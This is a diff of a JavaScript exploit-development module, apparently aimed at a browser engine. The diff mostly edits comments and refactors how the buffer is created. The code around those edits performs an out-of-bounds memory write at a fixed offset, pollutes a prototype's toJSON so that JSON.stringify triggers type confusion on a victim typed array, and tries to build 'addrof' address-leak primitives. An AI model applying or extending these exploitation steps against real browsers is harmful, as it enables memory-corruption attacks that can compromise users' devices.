@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Conteúdo da v5_ReliableLogging)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v5_ReliableLogging)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -13,9 +13,9 @@ export const FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL = "OriginalHeisenbug_TypedArra
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
-const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF; // Valor original da v5
+const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
 
-let last_probe_call_details_v5 = null;
+let last_probe_call_details_v5 = null; // v5 para esta versão
 let object_to_leak_A_v5 = null;
 let object_to_leak_B_v5 = null;
 let victim_typed_array_ref_v5 = null;
@@ -26,7 +26,7 @@ function toJSON_TA_Probe_ReliableLogging() {
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: true,
-        this_was_victim_ref_when_confused: null,
+        this_was_victim_ref_when_confused: null, // Renomeado para clareza
         writes_attempted_on_confused_this: false
     };
 
@@ -64,7 +64,7 @@ function toJSON_TA_Probe_ReliableLogging() {
     }
     
     logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Current_call_details to be set to global: ${JSON.stringify(current_call_details)}`, "dev");
-    last_probe_call_details_v5 = { ...current_call_details };
+    last_probe_call_details_v5 = { ...current_call_details }; // Shallow copy of THIS call's details
 
     return { minimal_probe_v5_did_execute: true }; 
 }
@@ -86,7 +86,7 @@ export async function executeTypedArrayVictimAddrofTest_ReliableLogging() {
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
     
-    const fillPattern = 0.44556677889900; // Padrão da v5
+    const fillPattern = 0.44556677889900;
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -96,21 +96,21 @@ export async function executeTypedArrayVictimAddrofTest_ReliableLogging() {
         logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
         logS3(`   OOB corruption target in oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);
 
-        // Pausas da v5 (apenas uma após a escrita)
         logS3(`STEP 1: Writing CRITICAL value ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
         oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
         logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
         
-        await PAUSE_S3(100); // Pausa padrão da v5
+        await PAUSE_S3(100);
 
-        victim_typed_array_ref_v5 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
-        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v5.buffer);
+        let underlying_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE);
+        victim_typed_array_ref_v5 = new Uint8Array(underlying_ab);
+        let float64_view_on_underlying_ab = new Float64Array(underlying_ab);
         
         for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
             float64_view_on_underlying_ab[i] = fillPattern + i;
         }
 
-        logS3(`STEP 2: victim_typed_array_ref_v5 (Uint8Array on buffer size ${VICTIM_BUFFER_SIZE}) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
+        logS3(`STEP 2: underlying_ab (size ${VICTIM_BUFFER_SIZE} bytes) and victim_typed_array_ref_v5 (Uint8Array) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
         logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v5 with ${toJSON_TA_Probe_ReliableLogging.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
@@ -130,6 +130,7 @@ export async function executeTypedArrayVictimAddrofTest_ReliableLogging() {
             
             logS3(`  JSON.stringify(victim_typed_array_ref_v5) completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
             
+            // Log the state of the global 'last_probe_call_details_v5' immediately after stringify
             logS3(`  Global 'last_probe_call_details_v5' state immediately after stringify: ${last_probe_call_details_v5 ? JSON.stringify(last_probe_call_details_v5) : 'null'}`, "dev");
 
             if (last_probe_call_details_v5) {
